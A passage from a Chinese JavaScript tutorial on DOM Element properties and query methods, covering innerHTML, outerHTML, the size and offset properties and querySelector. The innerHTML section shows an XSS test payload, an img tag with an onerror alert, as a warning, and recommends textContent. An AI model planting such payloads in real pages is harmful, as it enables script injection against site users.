<p>注意，读取属性值的时候，如果文本节点包含<code>&amp;</code>、小于号（<code>&lt;</code>）和大于号（<code>&gt;</code>），<code>innerHTML</code>属性会将它们转为实体形式 <code>&amp; amp;</code>、<code>&amp; lt;</code>、<code>&amp; gt;</code> 。如果想得到原文，建议使用<code>element.textContent</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML代码如下 &lt;p id=&quot;para&quot;&gt; 5 &gt; 3 &lt; 6 &amp;&lt;/p&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;para&#x27;</span>).<span class="property">innerHTML</span></span><br><span class="line"><span class="comment">// 5 &amp;gt; 3 &amp;lt; &amp;amp;</span></span><br></pre></td></tr></table></figure>

<p>写入的时候，如果插入的<strong>文本包含 HTML 标签，会被解析成为节点对象插入 DOM</strong>。注意，如果文本之中含有<code> &lt;script&gt; </code>标签，虽然可以生成<code>script</code>节点，但是插入的代码不会执行。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;&lt;script&gt;alert(&#x27;haha&#x27;)&lt;/script&gt;&quot;</span>; <span class="comment">// 插入包含js代码字符串，插入后js不会执行</span></span><br><span class="line">el.<span class="property">innerHTML</span> = name;</span><br></pre></td></tr></table></figure>

<p>上面代码将脚本插入内容，脚本并不会执行。但是，<code>innerHTML</code>还是有安全风险的。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;&lt;img src=x onerror=alert(1)&gt;&quot;</span>;</span><br><span class="line">el.<span class="property">innerHTML</span> = name;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>alert</code>方法是会执行的。<strong>因此为了安全考虑，如果插入的是文本，最好用<code>textContent</code>属性代替<code>innerHTML</code>。</strong></p>
<h4 id="1-7-Element-outerHTML-返回一个字符串，包含元素本身和所有子元素的HTML代码，可读写"><a href="#1-7-Element-outerHTML-返回一个字符串，包含元素本身和所有子元素的HTML代码，可读写" class="headerlink" title="1.7 Element.outerHTML 返回一个字符串，包含元素本身和所有子元素的HTML代码，可读写"></a>1.7 Element.outerHTML 返回一个字符串，包含元素本身和所有子元素的HTML代码，可读写</h4><p><code>Element.outerHTML</code>属性<strong>返回一个字符串，表示当前元素节点的所有 HTML 代码，包括该元素本身和所有子元素。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;d&quot;&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> d = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">d.<span class="property">outerHTML</span></span><br><span class="line"><span class="comment">// &#x27;&lt;div id=&quot;d&quot;&gt;&lt;p&gt;Hello&lt;/p&gt;&lt;/div&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>outerHTML</code>属性是<strong>可读写</strong>的，<strong>对它进行赋值，等于替换掉当前元素。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;container&quot;&gt;&lt;div id=&quot;d&quot;&gt;Hello&lt;/div&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> container = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;container&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> d = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;d&#x27;</span>);</span><br><span class="line">container.<span class="property">firstChild</span>.<span class="property">nodeName</span> <span class="comment">// &quot;DIV&quot;</span></span><br><span class="line">d.<span class="property">nodeName</span> <span class="comment">// &quot;DIV&quot;</span></span><br><span class="line"></span><br><span class="line">d.<span class="property">outerHTML</span> = <span class="string">&#x27;&lt;p&gt;Hello&lt;/p&gt;&#x27;</span>; <span class="comment">//div替换成p标签</span></span><br><span class="line">container.<span class="property">firstChild</span>.<span class="property">nodeName</span> <span class="comment">// &quot;P&quot;</span></span><br><span class="line">d.<span class="property">nodeName</span> <span class="comment">// &quot;DIV&quot;  但是变量b依旧指向原来的div元素，还存在于内存中</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，变量<code>d</code>代表子节点，它的<code>outerHTML</code>属性重新赋值以后，内层的<code>div</code>元素就不存在了，被<code>p</code>元素替换了。但是，<strong>变量<code>d</code>依然指向原来的<code>div</code>元素，这表示被替换的<code>DIV</code>元素还存在于内存中。</strong></p>
<p>注意，如果一个<strong>节点没有父节点，设置<code>outerHTML</code>属性会报错</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">outerHTML</span> = <span class="string">&#x27;&lt;p&gt;test&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// DOMException: This element has no parent node.</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>div</code>元素没有父节点，设置<code>outerHTML</code>属性会报错。</p>
<h4 id="1-8-Element-clientHeight-元素高度，Element-clientWidth元素宽度"><a href="#1-8-Element-clientHeight-元素高度，Element-clientWidth元素宽度" class="headerlink" title="1.8 Element.clientHeight 元素高度，Element.clientWidth元素宽度"></a>1.8 Element.clientHeight 元素高度，Element.clientWidth元素宽度</h4><p><code>Element.clientHeight</code>属性返回一个整数值，表示<strong>元素节点的 CSS 高度</strong>（单位像素），**只对块级元素生效，对于行内元素返回<code>0</code>**。如果块级元素没有设置 CSS 高度，则返回实际高度。</p>
<p>除了元素本身的高度，它还<strong>包括<code>padding</code>部分</strong>，但是不包括<code>border</code>、<code>margin</code>。如果有水平滚动条，还要减去水平滚动条的高度。注意，这个值始终是整数，如果是小数会被四舍五入。</p>
<p><code>Element.clientWidth</code>属性返回<strong>元素节点的 CSS 宽度，同样只对块级元素有效</strong>，也是只包括元素本身的宽度和<code>padding</code>，如果有垂直滚动条，还要减去垂直滚动条的宽度。</p>
<p><code>document.documentElement</code>的<code>clientHeight</code>属性，返回当前视口的高度（即浏览器窗口的高度），等同于<code>window.innerHeight</code>属性减去水平滚动条的高度（如果有的话）。<code>document.body</code>的高度则是网页的实际高度。一般来说，<code>document.body.clientHeight</code>大于<code>document.documentElement.clientHeight</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 视口高度  不包括不可见的部分</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">clientHeight</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 网页总高度</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">clientHeight</span></span><br></pre></td></tr></table></figure>



<h4 id="1-9-Element-clientLeft-左边框宽度，Element-clientTop上边框宽"><a href="#1-9-Element-clientLeft-左边框宽度，Element-clientTop上边框宽" class="headerlink" title="1.9 Element.clientLeft 左边框宽度，Element.clientTop上边框宽"></a>1.9 Element.clientLeft 左边框宽度，Element.clientTop上边框宽</h4><p><code>Element.clientLeft</code>属性等于元素节点<strong>左边框（left border）的宽度</strong>（单位像素），不包括左侧的<code>padding</code>和<code>margin</code>。如果没有设置左边框，或者是行内元素（<code>display: inline</code>），该属性返回<code>0</code>。该属性总是返回整数值，如果是小数，会四舍五入。</p>
<p><code>Element.clientTop</code>属性等于网页元素<strong>顶部边框的宽度</strong>（单位像素），其他特点都与<code>clientLeft</code>相同。</p>
<h4 id="1-10-Element-scrollHeight-元素总高度，Element-scrollWidth-元素总宽度"><a href="#1-10-Element-scrollHeight-元素总高度，Element-scrollWidth-元素总宽度" class="headerlink" title="1.10 Element.scrollHeight 元素总高度，Element.scrollWidth 元素总宽度"></a>1.10 Element.scrollHeight 元素总高度，Element.scrollWidth 元素总宽度</h4><p><code>Element.scrollHeight</code>属性返回一个整数值（小数会四舍五入），表示当前<strong>元素的总高度</strong>（单位像素），**包括溢出容器、当前不可见的部分。它包括<code>padding</code>**，但是不包括<code>border</code>、<code>margin</code>以及水平滚动条的高度（如果有水平滚动条的话），还包括伪元素（<code>::before</code>或<code>::after</code>）的高度。</p>
<p><code>Element.scrollWidth</code>属性表示当前<strong>元素的总宽度</strong>（单位像素），其他地方都与<code>scrollHeight</code>属性类似。这两个属性只读。</p>
<p><strong>整张网页的总高度</strong>可以从<code>document.documentElement</code>或<code>document.body</code>上读取。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 返回网页的总高度</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollHeight</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span></span><br></pre></td></tr></table></figure>

<p>注意，如果元素节点的内容出现溢出，即使溢出的内容是隐藏的，<code>scrollHeight</code>属性仍然返回元素的总高度。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;myDiv&quot; style=&quot;height: 200px; overflow: hidden;&quot;&gt;...&lt;div&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>).<span class="property">scrollHeight</span> <span class="comment">// 356</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，即使<code>myDiv</code>元素的 CSS 高度只有200像素，且溢出部分不可见，但是<code>scrollHeight</code>仍然会返回该元素的原始高度。</p>
<h4 id="1-11-Element-scrollLeft-元素水平滚动条右侧滚动的像素量，Element-scrollTop-元素垂直滚动条向下滚动的像素量"><a href="#1-11-Element-scrollLeft-元素水平滚动条右侧滚动的像素量，Element-scrollTop-元素垂直滚动条向下滚动的像素量" class="headerlink" title="1.11 Element.scrollLeft 元素水平滚动条右侧滚动的像素量，Element.scrollTop 元素垂直滚动条向下滚动的像素量"></a>1.11 Element.scrollLeft 元素水平滚动条右侧滚动的像素量，Element.scrollTop 元素垂直滚动条向下滚动的像素量</h4><p><code>Element.scrollLeft</code>属性表示<strong>当前元素的水平滚动条向右侧滚动的像素数量</strong>，<code>Element.scrollTop</code>属性表示<strong>当前元素的垂直滚动条向下滚动的像素数量</strong>。对于那些没有滚动条的网页元素，这两个属性总是等于0。</p>
<p>如果要查看整张网页的水平的和垂直的滚动距离，要从<code>document.documentElement</code>元素上读取。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollLeft</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span></span><br></pre></td></tr></table></figure>

<p>这两个属性都<strong>可读写</strong>，设置该属性的值，会导致浏览器将当前元素自动滚动到相应的位置。</p>
<h4 id="1-12-Element-offsetParent-返回最靠近当前元素的、并且-CSS-的position属性不等于static的上层元素"><a href="#1-12-Element-offsetParent-返回最靠近当前元素的、并且-CSS-的position属性不等于static的上层元素" class="headerlink" title="1.12 Element.offsetParent 返回最靠近当前元素的、并且 CSS 的position属性不等于static的上层元素"></a>1.12 Element.offsetParent 返回最靠近当前元素的、并且 CSS 的<code>position</code>属性不等于<code>static</code>的上层元素</h4><p><code>Element.offsetParent</code>属性<strong>返回最靠近当前元素的、并且 CSS 的<code>position</code>属性不等于<code>static</code>的上层元素</strong>。</p>
<blockquote>
<p>position:static; 即默认没有定位的样式。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;position: absolute;&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>span</code>元素的<code>offsetParent</code>属性就是<code>div</code>元素。</p>
<p><strong>该属性主要用于确定子元素位置偏移的计算基准</strong>，<code>Element.offsetTop</code>和<code>Element.offsetLeft</code>就是<code>offsetParent</code>元素计算的。</p>
<p>如果该元素是不可见的（<code>display</code>属性为<code>none</code>），或者位置是固定的（<code>position</code>属性为<code>fixed</code>），则<code>offsetParent</code>属性返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;position: absolute;&quot;</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;display: none;&quot;</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>span</code>元素的<code>offsetParent</code>属性是<code>null</code>。</p>
<p>如果某个元素的所有上层节点的<code>position</code>属性都是<code>static</code>，则<code>Element.offsetParent</code>属性指向<code>&lt;body&gt;</code>元素。</p>
<h4 id="1-13-Element-offsetHeight-元素的CSS垂直高度，Element-offsetWidth元素的CSS水平宽度"><a href="#1-13-Element-offsetHeight-元素的CSS垂直高度，Element-offsetWidth元素的CSS水平宽度" class="headerlink" title="1.13 Element.offsetHeight 元素的CSS垂直高度，Element.offsetWidth元素的CSS水平宽度"></a>1.13 Element.offsetHeight 元素的CSS垂直高度，Element.offsetWidth元素的CSS水平宽度</h4><p><code>Element.offsetHeight</code>属性返回一个整数，表示<strong>元素的 CSS 垂直高度</strong>（单位像素），<strong>包括元素本身的高度、padding 和 border，以及水平滚动条的高度（</strong>如果存在滚动条）。</p>
<p><code>Element.offsetWidth</code>属性表示<strong>元素的 CSS 水平宽度</strong>（单位像素），其他都与<code>Element.offsetHeight</code>一致。</p>
<p>这两个属性都是<strong>只读属性</strong>，只比<code>Element.clientHeight</code>和<code>Element.clientWidth</code>多了边框的高度或宽度。如果元素的 CSS 设为不可见（比如<code>display: none;</code>），则返回<code>0</code>。</p>
<h4 id="1-14-Element-offsetLeft-水平位移，Element-offsetTop-垂直位移"><a href="#1-14-Element-offsetLeft-水平位移，Element-offsetTop-垂直位移" class="headerlink" title="1.14 Element.offsetLeft 水平位移，Element.offsetTop 垂直位移"></a>1.14 Element.offsetLeft 水平位移，Element.offsetTop 垂直位移</h4><p><code>Element.offsetLeft</code>返回当前<strong>元素左上角相对于<code>Element.offsetParent</code>节点的水平位移</strong>，<code>Element.offsetTop</code>返回<strong>垂直位移</strong>，单位为像素。通常，这两个值是指相对于父节点的位移。</p>
<p>下面的代码可以算出元素左上角相对于整张网页的坐标。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getElementPosition</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> y = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (e !== <span class="literal">null</span>)  &#123;</span><br><span class="line">    x += e.<span class="property">offsetLeft</span>;</span><br><span class="line">    y += e.<span class="property">offsetTop</span>;</span><br><span class="line">    e = e.<span class="property">offsetParent</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> &#123;<span class="attr">x</span>: x, <span class="attr">y</span>: y&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-15-Element-style-返回CSSStyleDeclaration实例，用于操作CSS"><a href="#1-15-Element-style-返回CSSStyleDeclaration实例，用于操作CSS" class="headerlink" title="1.15 Element.style 返回CSSStyleDeclaration实例，用于操作CSS"></a>1.15 Element.style 返回CSSStyleDeclaration实例，用于操作CSS</h4><p>每个元素节点都有<code>style</code>用来读写该<strong>元素的行内样式信息</strong>，具体介绍参见《CSS 操作》一章。</p>
<h4 id="1-16-Element-children-类数组，所有子元素，Element-childElementCount-子元素个数"><a href="#1-16-Element-children-类数组，所有子元素，Element-childElementCount-子元素个数" class="headerlink" title="1.16 Element.children 类数组，所有子元素，Element.childElementCount 子元素个数"></a>1.16 Element.children 类数组，所有子元素，Element.childElementCount 子元素个数</h4><p><code>Element.children</code>属性<strong>返回一个类似数组的对象（<code>HTMLCollection</code>实例），包括当前元素节点的所有子元素</strong>。如果当前元素没有子元素，则返回的对象包含零个成员。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (para.<span class="property">children</span>.<span class="property">length</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> children = para.<span class="property">children</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; children.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码遍历了<code>para</code>元素的所有子元素。</p>
<p>这个属性与<code>Node.childNodes</code>属性的区别是，它只包括元素类型的子节点，不包括其他类型的子节点。</p>
<p><code>Element.childElementCount</code>属性返回当前元素节点包含的<strong>子元素节点的个数</strong>，与<code>Element.children.length</code>的值相同。</p>
<h4 id="1-17-Element-firstElementChild-首个子元素，Element-lastElementChild-最后一个子元素"><a href="#1-17-Element-firstElementChild-首个子元素，Element-lastElementChild-最后一个子元素" class="headerlink" title="1.17 Element.firstElementChild 首个子元素，Element.lastElementChild 最后一个子元素"></a>1.17 Element.firstElementChild 首个子元素，Element.lastElementChild 最后一个子元素</h4><p><code>Element.firstElementChild</code>属性返回当前元素的第一个元素子节点，<code>Element.lastElementChild</code>返回最后一个元素子节点。</p>
<p>如果没有元素子节点，这两个属性返回<code>null</code>。</p>
<h4 id="1-18-Element-nextElementSibling后一个兄弟元素节点，Element-previousElementSibling上一个兄弟元素节点"><a href="#1-18-Element-nextElementSibling后一个兄弟元素节点，Element-previousElementSibling上一个兄弟元素节点" class="headerlink" title="1.18 Element.nextElementSibling后一个兄弟元素节点，Element.previousElementSibling上一个兄弟元素节点"></a>1.18 Element.nextElementSibling后一个兄弟元素节点，Element.previousElementSibling上一个兄弟元素节点</h4><p><code>Element.nextElementSibling</code>属性返回当前元素节点的<strong>后一个同级元素节点</strong>，如果没有则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div-01&quot;&gt;Here is div-01&lt;/div&gt;</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div-02&quot;&gt;Here is div-02&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div-01&#x27;</span>);</span><br><span class="line">el.<span class="property">nextElementSibling</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;div-02&quot;&gt;Here is div-02&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>Element.previousElementSibling</code>属性返回当前元素节点的<strong>前一个同级元素节点</strong>，如果没有则返回<code>null</code>。</p>
<h3 id="2、实例方法"><a href="#2、实例方法" class="headerlink" title="2、实例方法"></a>2、实例方法</h3><h4 id="2-1-标签属性相关方法"><a href="#2-1-标签属性相关方法" class="headerlink" title="2.1 标签属性相关方法"></a>2.1 标签属性相关方法</h4><p>元素节点提供六个方法，用来操作属性。</p>
<h5 id="（1）getAttribute-：读取某个属性的值"><a href="#（1）getAttribute-：读取某个属性的值" class="headerlink" title="（1）getAttribute()：读取某个属性的值"></a>（1）<code>getAttribute()</code>：读取某个属性的值</h5><h5 id="（2）getAttributeNames-：返回当前元素的所有属性名"><a href="#（2）getAttributeNames-：返回当前元素的所有属性名" class="headerlink" title="（2）getAttributeNames()：返回当前元素的所有属性名"></a>（2）<code>getAttributeNames()</code>：返回当前元素的所有属性名</h5><h5 id="（3）setAttribute-：写入属性值"><a href="#（3）setAttribute-：写入属性值" class="headerlink" title="（3）setAttribute()：写入属性值"></a>（3）<code>setAttribute()</code>：写入属性值</h5><h5 id="（4）hasAttribute-：某个属性是否存在"><a href="#（4）hasAttribute-：某个属性是否存在" class="headerlink" title="（4）hasAttribute()：某个属性是否存在"></a>（4）<code>hasAttribute()</code>：某个属性是否存在</h5><h5 id="（5）hasAttributes-：当前元素是否有属性"><a href="#（5）hasAttributes-：当前元素是否有属性" class="headerlink" title="（5）hasAttributes()：当前元素是否有属性"></a>（5）<code>hasAttributes()</code>：当前元素是否有属性</h5><h5 id="（6）removeAttribute-：删除属性"><a href="#（6）removeAttribute-：删除属性" class="headerlink" title="（6）removeAttribute()：删除属性"></a>（6）<code>removeAttribute()</code>：删除属性</h5><p>这些方法的介绍请看《<strong>属性的操作</strong>》一章。</p>
<h4 id="2-2-Element-querySelector-返回第一个匹配的子元素"><a href="#2-2-Element-querySelector-返回第一个匹配的子元素" class="headerlink" title="2.2 Element.querySelector() 返回第一个匹配的子元素"></a>2.2 Element.querySelector() 返回第一个匹配的子元素</h4><p><code>Element.querySelector</code>方法接受 <strong>CSS 选择器作为参数，返回父元素的第一个匹配的子元素</strong>。如果没有找到匹配的子元素，就返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> content = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> el = content.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>上面代码返回<code>content</code>节点的第一个<code>p</code>元素。</p>
<p><code>Element.querySelector</code>方法<strong>可以接受任何复杂的 CSS 选择器</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;style[type=&#x27;text/css&#x27;], style:not([type])&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>注意，这个方法无法选中伪元素。</p>
<p>它可以接受多个选择器，它们之间使用逗号分隔。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.<span class="title function_">querySelector</span>(<span class="string">&#x27;div, p&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>上面代码返回<code>element</code>的第一个<code>div</code>或<code>p</code>子元素。</p>
<p>需要<strong>注意</strong>的是，浏览器执行<code>querySelector</code>方法时，是先在全局范围内搜索给定的 CSS 选择器，然后过滤出哪些属于当前元素的子元素。因此，会有一些违反直觉的结果，下面是一段 HTML 代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>111<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">blockquote</span> <span class="attr">id</span>=<span class="string">&quot;outer&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;inner&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>World<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">blockquote</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么，像下面这样查询的话，实际上返回的是第一个<code>p</code>元素，而不是第二个。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> outer = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;outer&#x27;</span>);</span><br><span class="line">outer.<span class="title function_">querySelector</span>(<span class="string">&#x27;div p&#x27;</span>)</span><br><span class="line"><span class="comment">// &lt;p&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="comment">// 违反自觉的结果，是因为会全局范围搜索到outer外面的div，然后再选出当前元素outer的子元素第一个p</span></span><br><span class="line"></span><br><span class="line">outer.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>).<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="comment">// &lt;p&gt;World&lt;/p&gt; 这样就能拿到里面的p元素</span></span><br></pre></td></tr></table></figure>



<h4 id="2-3-Element-querySelectorAll-返回NodeList实例，包含所有子元素"><a href="#2-3-Element-querySelectorAll-返回NodeList实例，包含所有子元素" class="headerlink" title="2.3 Element.querySelectorAll() 返回NodeList实例，包含所有子元素"></a>2.3 Element.querySelectorAll() 返回NodeList实例，包含所有子元素</h4><p><code>Element.querySelectorAll</code>方法接受 CSS 选择器作为参数，<strong>返回一个<code>NodeList</code>实例，包含所有匹配的子元素</strong>。</p>
<blockquote>
<p>返回的NodeList实例是<strong>类数组对象</strong></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;#test&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> matches = el.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;div.highlighted &gt; p&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>该方法的执行机制与<code>querySelector</code>方法相同，也是<strong>先在全局范围内查找，再过滤出当前元素的子元素</strong>。因此，选择器实际上针对整个文档的。</p>
<p>它也可以接受多个 CSS 选择器，它们之间使用逗号分隔。如果选择器里面有伪元素的选择器，则总是返回一个空的<code>NodeList</code>实例。</p>
<h4 id="2-4-Element-getElementsByClassName-通过class获取所有子元素"><a href="#2-4-Element-getElementsByClassName-通过class获取所有子元素" class="headerlink" title="2.4 Element.getElementsByClassName() 通过class获取所有子元素"></a>2.4 Element.getElementsByClassName() 通过class获取所有子元素</h4><p><code>Element.getElementsByClassName</code>方法返<strong>回一个<code>HTMLCollection</code>实例，成员是当前元素节点的所有具有指定 class 的子元素节点</strong>。该方法与<code>document.getElementsByClassName</code>方法的用法类似，只是搜索范围不是整个文档，而是当前元素节点。</p>
